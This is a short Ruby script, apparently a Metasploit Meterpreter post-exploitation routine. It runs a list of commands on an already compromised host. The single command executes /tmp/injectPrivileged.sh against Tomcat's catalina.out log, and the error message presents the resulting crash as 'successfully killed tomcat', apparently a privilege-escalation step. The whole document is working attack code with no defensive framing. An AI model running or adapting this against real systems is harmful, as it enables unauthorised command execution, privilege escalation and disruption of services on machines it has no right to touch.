def injectPrivileged(session, cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=2
    cmdlst.each do |cmd|
        begin
            print_status "running command #{cmd}"
            r = session.sys.process.execute("#{cmd}", nil, {'Hidden' => false, 'Channelized' => true})
            while(d = r.channel.read)
                print_status("#{d}")
            end
            r.channel.close
            r.close
        rescue ::Exception => e
            print_status("Connection was closed, successfully killed tomcat")
        end
    end
end

command_list = [
    "/tmp/injectPrivileged.sh /var/log/tomcat7/catalina.out"
]

injectPrivileged(client, command_list)